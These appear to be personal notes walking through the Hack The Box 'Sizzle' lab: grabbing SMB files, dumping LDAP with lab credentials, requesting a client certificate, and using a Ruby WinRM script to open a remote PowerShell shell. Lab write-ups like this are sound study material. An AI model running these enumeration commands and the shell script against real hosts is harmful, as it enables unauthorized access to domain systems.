
What can we do with a user name and password
```
prompt off
recurse on
ls
mget *
```
![[Pasted image 20240408013556.png]]

I don't know what's the certificate for now and whether we should generate it or not but will try to do secrets dump and ldapdump 1st.

```
ldapdomaindump ldaps://10.10.10.103 -u 'HTB\Amanda' -p 'Ashare1972'
```
![[Pasted image 20240408014627.png]]

Will run bloodhound on this tomorrow.

It seems like we have to do something with the certificate i guess. Like make a certificate for Amanda.

![[Pasted image 20240408131444.png]]

Will select advanced certificate request as User certificate throughs error at us.
![[Pasted image 20240408131533.png]]

But it's working cause we have to give some kind of output here like a key or something. So will go back to out Nmap result.

```
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
5986/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_ssl-date: 2023-11-19T17:59:11+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=sizzle.HTB.LOCAL
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, 
```

We know that port 5985 and 5986 both are used for winrm and one supports Http and another supports https.
As port 5985 is not working so we need to use port 5986 and for that reason we need certificate.

We will generate a certificate request and a private key : 
```
openssl genrsa -aes256 -out amanda.key 2048
```
![[Pasted image 20240408141724.png]]

```
openssl req -new -key amanda.key -out amanda.csr
```
![[Pasted image 20240408141959.png]]

```
-----BEGIN CERTIFICATE REQUEST-----
MIICijCCAXICAQAwRTELMAkGA1UEBhMCQVUxEzARBgNVBAgMClNvbWUtU3RhdGUx
ITAfBgNVBAoMGEludGVybmV0IFdpZGdpdHMgUHR5IEx0ZDCCASIwDQYJKoZIhvcN
AQEBBQADggEPADCCAQoCggEBAOUU4FjaASHFdmW/JmOqd0TKz61skZ56LJZf9PHM
EK2TuxeqY6/MGpcX/Wv5CNo3R9ab+QnUBCtjloQeUAhMeWwkBt3dam/bU36XSu9Z
ZXgGAq8QsWfprQhvdBtof4B4bRqZKybjIx1ks2ke7DC0BceIpcaWY7hI8eoIWbp7
yEJORqdSxKwvEhdKxywapn8N2sUqlFHw4VBU8sEuB8K7zwhTPkB9AJqSFEIx2Tcb
ZgFRrsUVIP6ThLhyBDn+sGfyhEufyOdl9yWxn4c8ncbioT3lw3DytDwHI6viA+mD
hPaBKLcbBC1A9fHTxp6OvHjvE/GmEyuhORW1MvhMMzDgBZMCAwEAAaAAMA0GCSqG
SIb3DQEBCwUAA4IBAQAg1ad9YxAtYsPwmy+ByQP1YkmVgHytK0m6fZ6Ss0PSfH7z
3UIqNDHqvDUPLHst9jbUApleuWmQWiaT+gbyoNYvubwZTRuSzWwqYMFVuRYLnvgI
oaYVAdxVUvewYGua1G7WRS+8volFRSTlReHktHb3XNnIIaXzPHDNFbA1HaARmY4x
Tx9FNfpglelmfpWMtDJvlfVUzUBUrIVeyR1PIG025x+zgBDROKHuq/2vBPpsQvCl
4ddWWGQ/AQmB5IPYHaGe62OJBh130GdLr0jbtn+RhSWiEpGLvq+HUVSw8qoePusY
W4zcIb4cjyDyaPu9sfK2e7ed6Zx/GF8a0SR4cpL2
-----END CERTIFICATE REQUEST-----
```

What i was doing wrong is that i was entering the wrong key we have to copy the .csr
![[Pasted image 20240408142323.png]]

How we have the key and will simply use a script winrm as you know that we can't connect to it through linux but luckily we have a Ruby library and will use it.

We install 
```
gem install winrm
``` 

Now we are getting this error
![[Pasted image 20240408170210.png]]

![[Pasted image 20240408181853.png]]

What i was doing wrong is that i was giving the wring certnew.cer (i.e the one we have downloaded). Authenticate through SSL using ruby (i.e. winrm)
```
require 'winrm'

# Author: Alamot

conn = WinRM::Connection.new(
  endpoint: 'https://10.10.10.103:5986/wsman',
  transport: :ssl,
  client_cert: 'certnew.cer',
  client_key: 'amanda.key',
  key_pass: 'testing',
  :no_ssl_peer_verification => true
)

command=""

conn.shell(:powershell) do |shell|
    until command == "exit\n" do
        output = shell.run("-join($id,'PS ',$(whoami),'@',$env:computername,' ',$((gi $pwd).Name),'> ')")
        print(output.output.chomp)
        command = gets
        output = shell.run(command) do |stdout, stderr|
            STDOUT.print stdout
            STDERR.print stderr
        end
    end
    puts "Exiting with code #{output.exitcode}"
end
```


```
ruby psremote.rb
```
![[Pasted image 20240408221759.png]]

